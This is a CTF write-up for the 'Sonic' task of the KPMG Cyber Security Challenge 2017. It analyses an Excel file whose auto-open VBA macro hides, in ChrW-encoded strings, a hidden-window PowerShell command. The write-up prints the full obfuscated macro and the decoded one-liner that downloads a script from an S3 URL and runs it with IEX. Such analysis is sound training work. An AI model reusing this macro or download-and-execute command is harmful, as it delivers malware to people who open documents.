## Description :
```
Ms.GG found the Sonic game in Flash embeded in the Excel files. There might be some clues if the game was cleared.

File: http://192.168.1.222:12812/41b76df12dc7b13316176eed2608a8cf/Sonic.zip

Flag format: KPMG{xxxxxxxxxx}
```

## File :
[Sonic.zip](Sonic.zip)


## Solution :

Opening up the sonic.xls we get the sonic flash game with warning of macro, enable it will popup `Go play game !!` as below for 10 times:

![flash](https://github.com/alejndalliance/KPMG-Cyber-Security-Challenge-2017/blob/master/ACT%204/sonic/flashgame.PNG?raw=true)

Lets take a look on the macro itself

```VB
Sub Auto_Open()
   Dim counter, myNum
   counter = 0
   myNum = 10
   Do While myNum > 8
     myNum = myNum - 1
     counter = counter + 1
     MsgBox "Go play game !!"
   Loop
    Dim first As String
    Dim second As String
    Dim third As String
    Dim fourth As String
    Dim fifth As String
    Dim sixth As String
    Dim seventh As String
    Dim eighth As String
    Dim ninth As String
    Dim tenth As String
    Dim eleventh As String
    Dim twelfth As String
    Dim thirteen As String
    Dim last As String
    first = ChrW(112) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108)
    second = ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(32) & ChrW(45) & ChrW(110) & ChrW(111) & ChrW(112) & ChrW(32)
    third = ChrW(45) & ChrW(119) & ChrW(32) & ChrW(104) & ChrW(105) & ChrW(100) & ChrW(100) & ChrW(101) & ChrW(110) & ChrW(32)
    fourth = ChrW(45) & ChrW(99) & ChrW(32) & ChrW(36) & ChrW(74) & ChrW(61) & ChrW(110) & ChrW(101) & ChrW(119) & ChrW(45)
    fifth = ChrW(111) & ChrW(98) & ChrW(106) & ChrW(101) & ChrW(99) & ChrW(116) & ChrW(32) & ChrW(110) & ChrW(101) & ChrW(116)
    sixth = ChrW(46) & ChrW(119) & ChrW(101) & ChrW(98) & ChrW(99) & ChrW(108) & ChrW(105) & ChrW(101) & ChrW(110) & ChrW(116)
    seventh = ChrW(59) & ChrW(36) & ChrW(74) & ChrW(46) & ChrW(112) & ChrW(114) & ChrW(111) & ChrW(120) & ChrW(121) & ChrW(61)
    eighth = ChrW(91) & ChrW(78) & ChrW(101) & ChrW(116) & ChrW(46) & ChrW(87) & ChrW(101) & ChrW(98) & ChrW(82) & ChrW(101)
    ninth = ChrW(113) & ChrW(117) & ChrW(101) & ChrW(115) & ChrW(116) & ChrW(93) & ChrW(58) & ChrW(58) & ChrW(71) & ChrW(101)
    tenth = ChrW(116) & ChrW(83) & ChrW(121) & ChrW(115) & ChrW(116) & ChrW(101) & ChrW(109) & ChrW(87) & ChrW(101) & ChrW(98)
    eleventh = ChrW(80) & ChrW(114) & ChrW(111) & ChrW(120) & ChrW(121) & ChrW(40) & ChrW(41) & ChrW(59) & ChrW(36) & ChrW(74)
    twelfth = ChrW(46) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(120) & ChrW(121) & ChrW(46) & ChrW(67) & ChrW(114) & ChrW(101) & ChrW(100) & ChrW(101) & ChrW(110) & ChrW(116) & ChrW(105) & ChrW(97) & ChrW(108) & ChrW(115) & ChrW(61) & ChrW(91) & ChrW(78) & ChrW(101) & ChrW(116) & ChrW(46) & ChrW(67) & ChrW(114) & ChrW(101) & ChrW(100) & ChrW(101) & ChrW(110) & ChrW(116) & ChrW(105) & ChrW(97) & ChrW(108) & ChrW(67) & ChrW(97) & ChrW(99) & ChrW(104) & ChrW(101) & ChrW(93) & ChrW(58) & ChrW(58) & ChrW(68) & ChrW(101) & ChrW(102) & ChrW(97) & ChrW(117) & ChrW(108) & ChrW(116) & ChrW(67) & ChrW(114) & ChrW(101) & ChrW(100) & ChrW(101) & ChrW(110) & ChrW(116) & ChrW(105) & ChrW(97) & ChrW(108) & ChrW(115) & ChrW(59) & ChrW(73) & ChrW(69) & ChrW(88) & ChrW(32) & ChrW(36) & ChrW(74) & ChrW(46) & ChrW(100) & ChrW(111) & ChrW(119) & ChrW(110) & ChrW(108) & ChrW(111) & ChrW(97) & ChrW(100) & ChrW(115) & ChrW(116) & ChrW(114) & ChrW(105) & ChrW(110) & ChrW(103) & ChrW(40) & ChrW(39) & ChrW(104) & ChrW(116) & ChrW(116)
    thirteen = ChrW(112) & ChrW(115) & ChrW(58) & ChrW(47) & ChrW(47) & ChrW(101) & ChrW(45) & ChrW(115) & ChrW(111) & ChrW(99) & ChrW(105) & ChrW(101) & ChrW(116) & ChrW(121) & ChrW(46) & ChrW(98) & ChrW(99) & ChrW(107) & ChrW(103) & ChrW(114) & ChrW(112) & ChrW(46) & ChrW(115) & ChrW(51) & ChrW(46) & ChrW(97) & ChrW(109) & ChrW(97) & ChrW(122) & ChrW(111) & ChrW(110) & ChrW(97) & ChrW(119) & ChrW(115) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(58) & ChrW(56) & ChrW(52) & ChrW(52) & ChrW(51) & ChrW(47) & ChrW(75) & ChrW(80) & ChrW(77) & ChrW(71) & ChrW(123) & ChrW(83) & ChrW(48) & ChrW(110) & ChrW(49) & ChrW(99) & ChrW(95) & ChrW(68) & ChrW(51) & ChrW(108) & ChrW(33) & ChrW(118) & ChrW(51) & ChrW(114) & ChrW(121) & ChrW(95) & ChrW(80) & ChrW(36) & ChrW(72) & ChrW(125) & ChrW(39) & ChrW(41) & ChrW(59)
    last = first + second + third + fourth + fifth + sixth + seventh + eighth + ninth + tenth + eleventh + twelfth + thirteen
    Shell (last)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
```

Add MsgBox to the `last` parameter to popup the flag

![macro](https://raw.githubusercontent.com/alejndalliance/KPMG-Cyber-Security-Challenge-2017/master/ACT%204/sonic/macro.PNG)

you will get powershell command to download file

![flag](https://raw.githubusercontent.com/alejndalliance/KPMG-Cyber-Security-Challenge-2017/master/ACT%204/sonic/flag.PNG)
```powershell
powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('https://e-society.bckgrp.s3.amazonaws.com:8443/KPMG{S0n1c_D3l!v3ry_P$H}');
```
Flag: `KPMG{S0n1c_D3l!v3ry_P$H}`
